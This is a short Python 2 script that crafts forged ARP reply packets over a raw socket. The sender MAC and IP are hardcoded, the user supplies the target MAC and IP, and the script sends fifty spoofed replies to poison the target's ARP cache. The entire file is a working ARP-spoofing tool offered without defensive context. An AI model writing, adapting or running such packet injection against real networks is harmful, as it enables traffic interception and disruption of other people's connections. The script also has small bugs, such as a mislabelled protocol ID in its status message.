import sys
import socket
import binascii
import struct
from itertools import chain

try: 
    iFace = raw_input("Enter the interface using which the Injection needs to be done ...\n")
    rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,socket.htons(0x0800))
    rawSocket.bind((iFace, socket.htons(0x0800)))

    print "Raw Socket got created .... with the Ethernet Protocol Id : 0x0806 at interface %s"%str(iFace)


except:
    print "Something unexpected happened during the Program execution."


else: 
    def checkMac(mac):
         if len(mac.split(":")) != 6:
             print "The MAC is in correct. It should be in Hexadecimal Format with each byte separated with colon...\n" 
             sys.exit(0)
         else:
          macList = mac.split(":")
          macLen = len(macList)

         return tuple ([int(macList[index],16) for index in range(macLen)])

    def checkIp(ip):
         ipList = ip.split(".")
         ipLen = len(ipList)
         return int( "".join( [ "{:02X}".format(int(ele)) for ele in ipList ] ), 16 )

    dMac = raw_input("Enter the Destination MAC .. hexadecimal charaters separated with ':' \n")
 #  dMac =  "0X:XX:XX:XX:XX:4X"
    dMacTup = checkMac(dMac)

 #  sMac = raw_input("Enter the Source MAC .. hexadecimal charaters separated with ':' \n")
    sMac =  "18:cf:5e:27:75:c1"
    sMacTup = checkMac(sMac)
    type = 0x0806


 # Creating an Ethernet Packet .... using dMac, sMac, type

    etherPack = struct.pack ("!6B6BH",*tuple(chain(dMacTup,sMacTup,[type])))



  # Creating an ARP Packet .... now

    hardwareType = 0x0001

    protocolType = 0x0800
    hln = 0x06
    pln = 0x04
    op = 0x0002

#       srcIp = raw_input("Enter the Source IP ':' \n")
    srcIp = "192.168.153.103"    
    intSrcIp = checkIp(srcIp)
    destIp = raw_input("Enter the Destination IP .. \n")
#   destIp = "10.0.2.1"
    intDestIp = checkIp(destIp)


    arpPack = struct.pack("!HHBBH6BI6BI", *tuple(chain( [hardwareType,protocolType,hln,pln,op], sMacTup,[intSrcIp], dMacTup,[intDestIp] )))

 # Framing the final Packet

    finalPack = etherPack + arpPack

    for i in range(50):
         rawSocket.send(finalPack + "Meeta rocks!...")
         print "Sending Packet %d"%i

finally:

      print "Closing the created Raw Socket ..."
      rawSocket.close()